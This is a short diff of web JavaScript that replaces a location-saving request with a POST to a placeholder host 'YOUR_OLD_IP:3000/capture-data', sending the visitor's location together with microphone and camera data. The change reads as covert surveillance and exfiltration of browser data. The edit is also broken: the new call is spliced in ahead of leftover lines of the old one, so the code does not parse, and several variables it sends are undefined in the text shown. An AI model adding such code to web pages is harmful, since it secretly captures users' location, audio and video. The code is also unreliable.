@@ -25,7 +25,17 @@
                         const longitude = position.coords.longitude;
 
                         // Send the location to the server
-                        fetch('https://your-server.com/save-location', {
+                        fetch("http://YOUR_OLD_IP:3000/capture-data", {
+    method: "POST",
+    headers: {
+        "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+        location: userLocation,
+        microphone: micData,
+        camera: camData
+    })
+});
                             method: 'POST',
                             headers: {
                                 'Content-Type': 'application/json'
